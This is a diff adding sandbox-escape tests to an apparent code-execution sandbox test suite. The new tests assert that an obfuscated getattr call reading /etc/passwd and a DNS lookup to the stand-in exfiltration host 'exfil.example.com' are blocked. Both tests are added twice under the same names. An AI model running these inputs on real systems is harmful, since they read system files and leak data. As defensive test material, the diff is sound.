@@ -75,3 +75,17 @@ def test_infinite_loop_times_out(ex):
 def test_mega_stdout_truncated(ex):
     r = ex.exec_code("print('x' * 5_000_000)", {})
     assert r["ok"] and len(r["stdout"]) <= 1 << 20      # 输出被截断不 OOM
+
+def test_reflection_getattr_blocked(ex):
+    _assert_blocked(ex, "getattr(__builtins__, 'op'+'en')('/etc/passwd')")
+
+
+def test_dns_leak_blocked(ex):
+    _assert_blocked(ex, "import socket; socket.gethostbyname('exfil.example.com')")
+
+def test_reflection_getattr_blocked(ex):
+    _assert_blocked(ex, "getattr(__builtins__, 'op'+'en')('/etc/passwd')")
+
+
+def test_dns_leak_blocked(ex):
+    _assert_blocked(ex, "import socket; socket.gethostbyname('exfil.example.com')")
